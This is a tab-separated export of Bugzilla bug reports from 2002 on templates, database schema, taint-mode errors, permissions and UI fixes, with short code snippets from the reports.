152632%TAB%1024393956%TAB%44872%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface,Bugzilla-General%TAB%'My Bugs' in footer doesn't reflect mybugstemplate param%TAB%'My Bugs' in footer doesn't reflect mybugstemplate paramIf you change the 'mybugstemplate' parameter, this change is reflected on the front page, but not in the footer. It turns out that the 'My Bugs' query is hard-coded into the footer. The footer should instead read the query from the 'mybugstemplate' parameter.  This can be fixed by changing line 101 of file 'template/en/default/global/useful-links.html.tmpl' from:            <a href="buglist.cgi?bug_status=NEW&amp;bug_status=ASSIGNED&amp;bug_status=REOPENED&amp;email1=[% user.login FILTER url_quote %]&amp;emailtype1=exact&amp;emailassigned_to1=1&amp;emailreporter1=1">My&nbsp;Bugs</a>  to:            <a href="[% mybugstemplate %]">My&nbsp;Bugs</a>  i.e. remove the hard-coding of the 'My Bugs' query.
152693%TAB%1024408409%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%duplicates-table.html.tmpl fails to mention "resolution" field in bug records%TAB%duplicates-table.html.tmpl fails to mention "resolution" field in bug recordsBug records passed to duplicates-table.html.tmpl contain a "resolution" field, but the comments documenting that record's format at the top of duplicates-table.html.tmpl fail to mention it.
152748%TAB%1024423441%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%index.cgi pimps for netscape.com%TAB%index.cgi pimps for netscape.comvar rv = window.confirm ("This page is enhanced for use with Netscape 6.  " +  "Would you like to upgrade now?"); if (rv) document.location.href = "http://home.netscape.com/download/index.html";  Bugzilla is a product of mozilla.org, as such it should advertise for  mozilla.org's products ...  This should probably be configurable, but by default we should show mozilla.org 
152761%TAB%1024427724%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%can't search by alias%TAB%can't search by aliascan't search by alias
152772%TAB%1024437309%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%buglist.cgi truncates emails at 45 characters%TAB%buglist.cgi truncates emails at 45 charactersbuglist.cgi truncates long email addresses at 45 characters, while the fix for bug 103592 used 30.  I think myk did this in the templatisation. Any reason for this? I don't think anyone's email is currently being truncated on buglist.cgi, which makes the feature a bit useless.
152899%TAB%1024477928%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%mid-air collision while marking a dup duplicates "this bug has been marked..."%TAB%mid-air collision while marking a dup duplicates "this bug has been marked..."Steps: 1. Load a bug. 2. Someone else adds a comment. 3. Try to mark the bug as a dup (in my case, without adding a comment). 4. Click through the "mid-air collision" page.  Result: the "this bug has been marked as a duplicate of" line is duplicated
152935%TAB%1024489641%TAB%26341%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%Pref for no notification on Target Milestone change not respected.%TAB%Pref for no notification on Target Milestone change not respected.I am running Bugzilla 2.14.2 and some of my users have turned off email notification for "Priority, status, severity, and milestone changes".  However, notifications are still being sent when the milestone changes. 
153129%TAB%1024554244%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General,Database%TAB%mediumtext abuse,Bugzilla uses "mediumtext" as a DB data type when it's not necessary%TAB%mediumtext abuse,Bugzilla uses "mediumtext" as a DB data type when it's not necessarymediumtext may be up to 2^24-1 characters, or just under 16 megs (justdaves comment in bug 96431 about this is incorrect)  The following fields may be up to 16 megs in length:   - The description of an attachment   - The mimetype for an attachment   - The filename for an attachment   (These are all longer than the size for the attachment, see below)   - The description for an attachment status   - the short_desc for a bug (bug 96431)   - the status whiteboard for a bug   - the keyword cache for a bug   - text for a comment (this is probably ok)   - description for a component.   - description for a product   - disabledtext for a user   - email flags for a user (covered under bug 73665)   - stored named query   - description for fielddefs   - description for a keyword   - command for a shadowlog (ignore this)  - An attachment is longblob, or 4 Gigs.  The mysql client/server protocol limits packet sizes to 16 megs, and the default is 1 meg. This makes longblob totally useless, and mediumtext semi-useless for most things (the actual attachment/comments being an exception, since those have separate limits)  We need to have limits checked in the code for all this stuff, and then change the schema.
153333%TAB%1024630131%TAB%18766%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%bugzilla.org%TAB%landfill.bugzilla.org index page missing%TAB%landfill.bugzilla.org index page missingThe landfill index page seems to have been replaced with a default Apache document root index page. The Bugzilla installations on landfill still seem to work, but http://landfill.bugzilla.org/ does not.
153445%TAB%1024657298%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General,Administration%TAB%editproducts.cgi takes forever to load data I don't need%TAB%editproducts.cgi takes forever to load data I don't needWith a particularly large installation, like bmo, where we have many, many products all with many, many bugs loading editproducts.cgi takes a long time (I average just under 1 minute). 9 out of 10 times that I hit editproducts.cgi I'm just trying to get to a particular component to edit (http://bugzilla.mozilla.org/editproducts.cgi?action=edit&product=foo). I don't need the Status, Votes per user, Max Votes per bug, Votes to confirm, Bugs counts, or even the description. I'm not sure what part of the lookup causes it to take so long but I suspect it's the bug count.  I can think of two ways to make this better: 1. don't do the expensive lookup (if one of them is most to blame) but provide a link "more info" or something on editproducts.cgi that will trigger the lookup and provide that extra data, or only do the lookup once a day. 2. drop the entire table and just give me an html select with all available products and an "add additional product" link. The delete action could be moved to within the actual product (http://bugzilla.mozilla.org/editproducts.cgi?action=edit&product=foo).
153461%TAB%1024661634%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%describe components shouldn't give an error for a bad product%TAB%describe components shouldn't give an error for a bad productdescribe components shouldn't give an error for a bad product
153540%TAB%1024701153%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%products/components/versions tables don't have indexes,products/components tables don't have indexes%TAB%products/components/versions tables don't have indexes,products/components tables don't have indexesAnyone know why neither products, components or versions tables have indexes?  products should be: 'unique(product)' components should be: 'unique(value, program)' versions should be: 'unique(program, value)'  with the appropriate checksetup changes to check for duplicates first. editproducts + friends already do this, though, so there shouldn't be any such duplicates.  This should probably be done before bug 43600, to make the conversion code for that be simpler.
153578%TAB%1024721645%TAB%5168%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Attachment 'Modified' date does not match 'View Activity' date for change,Attachment modified date is meant to be attachment creation date%TAB%Attachment 'Modified' date does not match 'View Activity' date for change,Attachment modified date is meant to be attachment creation dateAttachment 'Modified' date does not match 'View Activity' date for change.  In the given URL, I added an attchment that I later obsoleted. In the 'Modified' column it says:        2002-06-22 05:56 In the 'View Bug Activity' list it says: 2002-06-22 05:58:36  The comment that was created when I first attached it says: 2002-06-22 05:56  My guess is that 'Modified' really is 'Created' ?
153583%TAB%1024723625%TAB%5168%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%Links to obsoleted attachment should use line-through style%TAB%Links to obsoleted attachment should use line-through styleLinks to obsoleted attachment should use line-through style.
153629%TAB%1024750559%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Remember query options contains invalid html%TAB%Remember query options contains invalid html"We have nested tables, and a <p> arround one of them, and..."  So we do. The radiobutton group with run/remember/load/etc. options really has some horrible and invalid HTML. I'll take a look at this soon.
153811%TAB%1024859460%TAB%58371%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%default severity should be parametrized%TAB%default severity should be parametrizedI apologize if this has been submitted before. I searched the database and found some items close to it (which I will reference) but nothing completely like it.  When doing a clean BugZilla installation, running checksetup creates a localconfig file that you can modify at your hearts content.  One of the items in here that appears to be modifiable is severity.  I changed the severities to put them more in line with what my company uses.  Unfortunately now when I try to enter a bug it complains about potential data corruption.  The culprit seems to be with  enter_bug.cgi Version 2.14.2 approximate line 234 You make the popup box for severity but normal is hard-coded as the default. If you've modified the severities in your localconfig, this may not be the case anymore.  It might be better if you allow default severity to be set up in the parameters also.
153814%TAB%1024866289%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%bugzilla.org%TAB%Loosen up the checkin instructions in reviewers' guide%TAB%Loosen up the checkin instructions in reviewers' guideThe reviewer's guide says that 'If the bug owner has checkin authority, they should check the patch in, otherwise the reviewer who adds the "second-review" attachment status should do this.  If the reviewer can't, anyone else who can should.'  I'd change this to  'If the bug owner has checkin authority, they should check the patch in. If he/she can't check the patch in, anyone else who can should.'
153874%TAB%1024891025%TAB%58400%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface,Bugzilla-General%TAB%Query In Sidebar doesn't work%TAB%Query In Sidebar doesn't workIn Bugzilla (2.16rc2) the Query-Line doesn't work well. It generates a "double" URL
154004%TAB%1024924957%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%QuickSearch should be able to find a bug by its alias%TAB%QuickSearch should be able to find a bug by its aliasOn b.m.o, the bug lookup text box in the footer supports lookup by alias. QuickSearch doesn't do this. It should, in some form.  Here is some discussion from the webtools newsgroup:  ======================= [jesse:] Btw, we should remove the "alias" field before it becomes  impossible to change the bug id boxes to search boxes.   The alias field is a workaround for searches being slow,   and searches will soon become faster. ======================= [afranke:] There is an alternative solution: Enable quicksearch to find bugs by their aliases (or substrings of their aliases).  Currently this can only be implemented as a special prefix, e.g. alias:bmo-regressions ,which would defeat most of the usability win. But when the perl port to quicksearch is checked, then it could first check whether one  of the non-prefixed word-fragments entered in the quicksearch  box occurs as a substring in some alias for a bug, and display  the matches at the top of the result page, before the "normal"  query results. And if you enter only a single string and there  exists a bug with exactly that alias, then the "normal" query  does not need to be executed anymore because the bug is probably  the one the user is looking for. In this case, there can be a  link on the result page that executes the normal quicksearch query, without looking for aliases again. ===================== [gerv:] A simpler alternative to your alternative - restrict aliases to the set  [A-Za-z-_] (if they aren't already) and then do an alias lookup first if  the search is a single word. ===================== [afranke:] Yes, but you still need the perl port of quicksearch  for this, because from JS you can't find out whether the returned result from show_bug.cgi?id=foo is a  bug view or a not-found error message, and fall back to the normal quicksearch in the latter case. Or can you do this? How? Btw, the perl-port checkin thing is in bug 70907.  (I still think substring search in the aliases is better than just exact lookup because e.g. you will want to hit bmo-regressions if you type in bmo, or regressions, or even regression.)
154008%TAB%1024926004%TAB%49184%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Basic script maintenance: contrib email scripts (bug_email.pl & bugzilla_email_append.pl)%TAB%Basic script maintenance: contrib email scripts (bug_email.pl & bugzilla_email_append.pl)Description • 22 years ago While trying to get the two email-based bug management systems (bug_email.pl  and bugzilla_email_append.pl) up and working, I ran across a number of issues  that I believe should be resolved within Bugzilla.  While I realize that these scripts are not officially supported, and that their  basic structure and functioning are being questioned, the fact that they are  present as part of Bugzilla means that there should be basic mantinance done to  them from time to time.  In this spirit, I propose the following patches. 
154036%TAB%1024934405%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%ccing an invalid user on a bug posts the bug anyway%TAB%ccing an invalid user on a bug posts the bug anywayTo reproduce:  1. File a bug, ccing a nonexistent account  Expected: - Error msg, and bug not filed  Actualy: - Error msg, but bug filed anyway!  This is because we do additional checking after the INSERT in post_bug!!!  If we had transactions, this would be ok, but we don't, so we have to take care of this ourselves.
154278%TAB%1025023788%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%attachment markup is wrong%TAB%attachment markup is wrong<pre><a href="attachment.cgi?id=80008&amp;action=view">Created an attachment  (id=80008)</a> proposed fix </pre>   <br>     <i>------- Additional Comment       <a name="c17" href="#c17">#17</a> From        <a href="mailto:bryner@netscape.com">Brian Ryner</a>       2002-04-19 13:02 -------     </i>        <br>  <pre>(From update of <a  href="attachment.cgi?id=80008&amp;action=view">attachment 80008 [details] [diff] [review])</a> r=bryner </pre>   <br>     <i>------- Additional Comment       <a name="c18" href="#c18">#18</a> From        <a href="mailto:varga@utcru.sk">Jan Varga</a>       2002-04-20 06:12 -------     </i>        <br>  I propose while ($text =~ s/\bCreated an  attachment(\s|%\#)*\(id=(\d+)\)|attachment(\s|%\#)*(\d+)/"##$count##"/ei) {
154482%TAB%1025100114%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%having all checkboxes unchecked a non fatal error or at least clarify it,Checking none of the checkboxes in the "Email Addresses, Bug Numbers, and Votes" section of query.cgi shouldn't throw an error%TAB%having all checkboxes unchecked a non fatal error or at least clarify it,Checking none of the checkboxes in the "Email Addresses, Bug Numbers, and Votes" section of query.cgi shouldn't throw an errorYou must specify one or more fields in which to search for timeless.  The error should either be non fatal, or it should clearly indicate which field  messed up, since i have two fields with the same string.
154484%TAB%1025101049%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%is exactly not for email addresses,Option "is not" missing for email address searches%TAB%is exactly not for email addresses,Option "is not" missing for email address searcheswe have: regexp not regexp substring exact  we don't have: is not
154627%TAB%1025162818%TAB%58763%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%#!d:/perl/bin/perl -wT,processmail.pl taint problem on W32/Apache%TAB%#!d:/perl/bin/perl -wT,processmail.pl taint problem on W32/Apache------------------- -- In Error Log: -- ------------------- Premature end of script headers: d:/usr/bugzilla-2.16rc1/post_bug.cgi Too late for "-T" option at ./processmail.pl line 1.    ----------------------------------------- -- In Browser I receive Error message: -- ----------------------------------------- Internal Server Error The server encountered an internal error or misconfiguration and was unable to  complete your request. Please contact the server administrator, bugs-admin@localhost.localdomain and  inform them of the time the error occurred, and anything you might have done  that may have caused the error. ------------------------------------------  Comment 3 • 22 years ago I have Windows 2000 and Apache 1.3 installed.  After removing -T flag from "#!d:/perl/bin/perl -wT" it seems to work
154638%TAB%1025166270%TAB%58763%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Creating/Changing Bugs%TAB%Error in post_bug.cgi,post_bug.cgi fails on certain Win32 setups w/ processmail%TAB%Error in post_bug.cgi,post_bug.cgi fails on certain Win32 setups w/ processmail------------------- Internal Server Error ----------------------   And in error.log file I can find following: ----------------------------------------------  Premature end of script headers: d:/usr/bugzilla-2.16rc1/post_bug.cgi Use of uninitialized value in split at d:/Perl/lib/Cwd.pm line 103 (#1)       (W uninitialized) An undefined value was used as if it were already       defined.  It was interpreted as a "" or a 0, but maybe it was a mistake.       To suppress this warning assign a defined value to your variables.              To help you figure out what was undefined, perl tells you what operation       you used the undefined value in.  Note, however, that perl optimizes your       program and the operation displayed in the warning may not necessarily       appear literally in your program.  For example, "that $foo" is       usually optimized into "that " . $foo, and the warning will refer to       the concatenation (.) operator, even though there is no . in your       program.          processmail.pl: Use of uninitialized value in split at d:/Perl/lib/Cwd.pm line  103.
155031%TAB%1025372395%TAB%32552%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%Section isn't being if'd out when votes are turned off,Search by votes is shown even when votes are turned off%TAB%Section isn't being if'd out when votes are turned off,Search by votes is shown even when votes are turned offthe section "Only bugs with at least: [  ]  votes" isn't being properly if'd out when votes are turned off. 
155033%TAB%1025373032%TAB%32552%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%standardizing on <a>NAME</a>: vs. <a>NAME:</a>%TAB%standardizing on <a>NAME</a>: vs. <a>NAME:</a>In several places the titles for the various components appear as <a href="blah">NAME:</a>, rather than the "standard" (as per discussion with bbaetz) of <a href="blah">NAME</a>: This is a trivial bug, but I'd rather stay consistant...
155119%TAB%1025450143%TAB%5603%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Creating/Changing Bugs%TAB%reassigning bugs to a product with no components gives  'browser' error%TAB%reassigning bugs to a product with no components gives  'browser' error1) Create a product with no component. 2) reassign a bug to that component. 3) Note that in the next screen you're asked to pick a blank component.  Hit the commit button anyway. 4) since you've submitted with an undefined component (you had no other option!) you get a browser error dialog.  So, this is awfully confusing for users who've been trapped by an adminstrator who screwed up.  So... two possible solutions: *fix process_bug.cgi to throw a meaningful error if the component is undefined. *do the more sane thing and make it impossible (or at least much harder) to create a product without immediately creating a component.
155343%TAB%1025567764%TAB%12816%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%wrong [% interface %] in header.html.tmpl,header.html.tmpl has an unused "extra" parameter%TAB%wrong [% interface %] in header.html.tmpl,header.html.tmpl has an unused "extra" parameterWas trying to enable site navigation bar and found following errors in header.html.tmpl - in interface there are described wrong names:    # extra: string. Any other HTML to go inside the <head> tags. this is not used at all in header template, also - edit.html.tmpl calls out header with parameter "header_html"     # jscript: string. Javascript to go in the header. in body is used parameter "javascript"     # style_urls: list. List of URLs to CSS style sheets. this one is very funny - [% IF style_urls %] statement correct (in plural), but link is set in singular ;) fragment from code: ==============     [% IF style_urls %]       [% FOREACH style_url = style_urls %]         <link href="[% style_url %]" rel="stylesheet" type="text/css">       [% END %]     [% END %] ==============
155388%TAB%1025590401%TAB%12816%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Site navigation bar link broken in 2.16%TAB%Site navigation bar link broken in 2.16Site navigation bar links broken in 2.16 Reasons:  1) edit.html.tmpl passes header_html parameter to header template (wich doesn't have such parameter)  2) it seems to me, that TT doesn't allow to call functions as it is done in edit.html.tmpl
155389%TAB%1025590501%TAB%12816%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Complete use of site navigation bar [<link> tags],Add <link> tags for queries and basic functions,More <link> elements & templatization of navigation_links%TAB%Complete use of site navigation bar [<link> tags],Add <link> tags for queries and basic functions,More <link> elements & templatization of navigation_linksI needed a placeholder bug for this
155400%TAB%1025592599%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Fix permissions model%TAB%Fix permissions modelOur permissions model is currently a mess. Newsgroup discussion came up with the following, which I intend to implement:  No permissions - can add comments and change CCs  Has canconfirm - can add comments, change CCs, and confirm a bug  Has canedit - can edit any aspect of a bug QA Contact - can edit any aspect of a bug Assignee - can edit any aspect of a bug  (So, being the QA Contact or the Assignee can be implemented as having canedit for that bug only.)  Reporter - can edit any aspect of a bug, except: confirmed status priority unless Param("letsubmitterchoosepriority") target milestone  (So, being a reporter has to be an extra flag, because they are different.) 
155414%TAB%1025597261%TAB%15223%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%useraccount not found error message is wrong,"Account not found" error should be more friendly%TAB%useraccount not found error message is wrong,"Account not found" error should be more friendlyError       The name markh@activestate.com is not a valid username. Either you  misspelled it, or the person has not registered for a     Bugzilla account.   Error       The name jst@netscpae.com is not a valid username. Either you misspelled  it, or the person has not registered for a     Bugzilla account.  The first one is wrong, I did not misspell it, the person does have a bugzilla  account, it happens to be mhammond@skippinet.com.au, it's possible the user  changed his account name at some point in time.  [really nitty] The second one isn't quite right either, I didn't misspell it, I  just copied it from  bonsai.mozilla.org/cvslog.cgi?file=mozilla/xpcom/components/nsIClassInfo.idl where jst happened to misspell his own name.  What I'd like: 1. friendlier error messages, 2. perhaps with links to findusers.cgi (which is that thing justdave promised  to help land after 2.16). 3. it'd be nice if bugzilla listed all of the errors at once instead of making  me submit until it ran out of errors.
155502%TAB%1025633025%TAB%14303%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%Bugzilla search / query should focus summary field%TAB%Bugzilla search / query should focus summary fieldWhen you go to the search form, no field has focus. The summary field should have focus by default, so you can immediately start typing, just like on the index page with quicksearch and most search engines.  This is easily accomplished with a line of javascript:  <script language="JavaScript"> <!-- document.forms['queryform'].short_desc.focus() // --> </script>  One place to add this is on line 30 of bugzilla/template/en/default/search/search.html.tmpl Change:  onload = "selectProduct(document.forms['queryform']);" to  onload = "selectProduct(document.forms['queryform']); document.forms['queryform'].short_desc.focus()"  Although this is a minor change, it will save time for all users.
155584%TAB%1025669369%TAB%20977%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%Opening duplicates.cgi with no frequent bugs causes SQL syntax error%TAB%Opening duplicates.cgi with no frequent bugs causes SQL syntax errorOpening duplicates.cgi in an installation where no bugs are within the frequent bug threshold causes the following SQL syntax error:  Software error:    SELECT bugs.bug_id, component, bug_severity, op_sys, target_milestone,          short_desc, bug_status, resolution   FROM bugs    LEFT JOIN cc selectVisible_cc ON                       bugs.bug_id = selectVisible_cc.bug_id AND                       selectVisible_cc.who = 1 WHERE ((bugs.groupset & 9223372036854775807) = bugs.groupset OR (bugs.reporter_accessible = 1 AND bugs.reporter = 1) OR (bugs.cclist_accessible = 1 AND selectVisible_cc.who = 1 AND not isnull(selectVisible_cc.who)) OR (bugs.assigned_to = 1) OR (bugs.qa_contact = 1)) AND (bug_status != 'CLOSED')    AND   ((bug_status = 'VERIFIED' AND resolution IN ('INVALID', 'WONTFIX'))           OR (bug_status != 'VERIFIED'))   AND bugs.bug_id IN (): You have an error in your SQL syntax near ')' at line 10 at globals.pl line 276. 
155700%TAB%1025711944%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%taint error in SendSQL when called from ValidateBugID%TAB%taint error in SendSQL when called from ValidateBugIDValidateBugID makes sure the ID is valid in a way that doesn't detaint it.  ValidateBugID needs to trick_taint/detaint_natural the ID.
155743%TAB%1025741977%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation,attachment and request management,Documentation%TAB%Remove win32 specific attachment stuff,Remove win32 specific attachment stuff from Bugzilla Guide%TAB%Remove win32 specific attachment stuff,Remove win32 specific attachment stuff from Bugzilla GuideThe win32 specific attachment stuff can be removed from the 2.18 documentation
155793%TAB%1025768134%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%$::FORM is not tainted under perl 5.6.1%TAB%$::FORM is not tainted under perl 5.6.1While looking into why I didn't see bug 155700, it turns out that perl > 5.6.0 has broken |use taint 're'|, which we use to avoid tainting . I've filed a bug with a test case - see the URL.  The workarround is to assign a known-tainted value to $item and $value first, before. The alternate fix is to use split, rather than $1 (like CGI.pm does), or to avoid using $1, and just assign from the result of the m// directly (which appears to avoid triggering this bug)  I'll wait to see what the response is before deciding which one to do, but we should do one of them for 2.16.
155861%TAB%1025815988%TAB%30895%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%showdependancygraph.cgi fails taint check with local dot installation%TAB%showdependancygraph.cgi fails taint check with local dot installationTrying to show the dependancy graph using a locally installed version of dot causes perl to throw a taint "insecure dependancy in showdependancygraph.cgi at line 192" error.  This line is;  foreach my $f (glob("data/webdot/*.dot                       data/webdot/*.png                       data/webdot/*.map"))  There is a "trick_taint" further down in the loop which I guess is supposed to stop this, but it seems to be the glob that is causing it.  I've got it working by replacing the above 3 lines with the following 4;  opendir(DIR, "data/webdot/"); my @taintf = grep { /\.dot$|\.png$|\.map$/ } readdir(DIR); closedir(DIR); foreach my $f (@taintf)   I'm not 100% sure the regex is right, but it seems to work now and the graph is generated.  I'll have to wait a few days to so to see if it is deleting old graphs.
156169%TAB%1026077075%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%bug # in attachment editor should be styled like it is everywhere else%TAB%bug # in attachment editor should be styled like it is everywhere elsei loaded 6 tabs w/ edit attachment pages but i can't tell if the bugs are enhancements or resolved or 
156426%TAB%1026181094%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Query interface uses ´ instead of ' in "doesn't"%TAB%Query interface uses ´ instead of ' in "doesn't"The "doesn't contain regexp" options have accent characters (doesn´t) where there should be apostrophes (doesn't).
156436%TAB%1026184068%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%IBM Web Browser is unrecognized%TAB%IBM Web Browser is unrecognizedjavascript:navigator.userAgent Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:0.9.2) Gecko/20011016
156548%TAB%1026221340%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Reporting/Charting%TAB%XUL version of duplicates report%TAB%XUL version of duplicates reportThere should be a XUL version of the duplicates report.
156559%TAB%1026224280%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%mysqld-watcher.pl should kill multiple queries at once, quicker, and with better notification%TAB%mysqld-watcher.pl should kill multiple queries at once, quicker, and with better notificationmysqld-watcher.pl should kill all queries that have taken too long to run, not just the longest running one.  Also, it should kill queries after 3 minutes (at the most); queries taking more time than that are unlikely to ever return.  Finally, it should output more information about the queries it kills, f.e. the full query string, so admins can more effectively fix slow-running queries.
156563%TAB%1026225011%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%RDF output should include URI of installation being queried%TAB%RDF output should include URI of installation being queriedThe RDF output of buglist.cgi should include the URI of the installation being queried, because it is useful for external clients using RDF aggregation on the results.
156564%TAB%1026225143%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%treat bug IDs as integers in RDF output%TAB%treat bug IDs as integers in RDF outputBug IDs are integers and should be flagged as such in the RDF output of buglist.cgi.
156568%TAB%1026225633%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%data dir is not correctly created%TAB%data dir is not correctly createdchecksetup.pl has an |unless (-d 'data')| block.  However, this comes after the include of globals.pl, and globals.pl creates a new template object, which creates 'data' and 'data/template' for us, becuase of the COMPILE_DIR.  We need to move just that block to above the |require|, to ensure that the other files are created.  To be honest, I don't know if thats needed - I suspect the code deals with those files not existing w/o problems.
156670%TAB%1026279825%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%bug alias field messes up at 800x600%TAB%bug alias field messes up at 800x600No, thats not the reason its wrapping. If the email address wraps onto more than one line (long realname, for example), the moz wraps the content. Using a &nbsp; instead of the space before the text input field didn't help - are #text->element boundaries line wrap points? I didn't try playing with <nobr>, though.
156680%TAB%1026282553%TAB%8939%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%Undefined value in globals.pl,Undefined variable warning from createaccount.cgi%TAB%Undefined value in globals.pl,Undefined variable warning from createaccount.cgiI just upgraded my bugzilla from 2.14 to 2.16rc2 and got the following warning from createaccount.cgi:  Use of uninitialized value in substitution (s///) at globals.pl line 1512 (#1)     (W uninitialized) An undefined value was used as if it were already     defined.  It was interpreted as a "" or a 0, but maybe it was a mistake.     To suppress this warning assign a defined value to your variables.          To help you figure out what was undefined, perl tells you what operation     you used the undefined value in.  Note, however, that perl optimizes your     program and the operation displayed in the warning may not necessarily     appear literally in your program.  For example, "that $foo" is     usually optimized into "that " . $foo, and the warning will refer to     the concatenation (.) operator, even though there is no . in your     program.      [Wed Jul 10 11:20:05 2002] createaccount.cgi: Use of uninitialized value in substitution (s///) at globals.pl line 1512. Use of uninitialized value in substitution (s///) at globals.pl line 1513 (#1) [Wed Jul 10 11:20:05 2002] createaccount.cgi: Use of uninitialized value in substitution (s///) at globals.pl line 1513.  I was able to workaround the bug by modifying the trim method in globals.pl to check for an undefined value like so:   # Trim whitespace from front and back.  sub trim {     my ($str) = @_;     if(defined $str)     {         $str =~ s/^\s+//g;         $str =~ s/\s+$//g;     }     return $str; }  and things are working well now. My bugzilla is running on solaris 2.6, perl 5.6.1, mysql 3.23.45, Netscape Enterprise Server 3.6
156751%TAB%1026298095%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Create bugzilla-announce@bugzilla.org mailing list%TAB%Create bugzilla-announce@bugzilla.org mailing listWe need a release-and-security-announcement mailing list, for all those Bugzilla admins out there.
156834%TAB%1026329710%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%Remove timestamp fields%TAB%Remove timestamp fieldsThe auto-updating timestamp fields are a pain. They're not cross-db compatable, and we keep forgetting to stop updating them. See bug 153578, among others.  Instead of using the mysql timestamp type, we should use the mysql datetime type (which is the same as the ANSI/SQL timestamp type), and assign into it where needed.
156844%TAB%1026336449%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Creating/Changing Bugs%TAB%'use of uninitialized value in string eq' warning%TAB%'use of uninitialized value in string eq' warningprocess_bug calls CheckCanChangeField based on the 'snapshot' of the bug. For aliases, the alias column is NULL, and so we end up doing a string eq between undef and ''.  The fix is to consider a NULL value to be an empty string for this test.
157074%TAB%1026433711%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%verify-new-product doubles comment linefeeds on Win32%TAB%verify-new-product doubles comment linefeeds on Win32On Win32, going through the verify-new-product template doubles linefeeds on all comments.
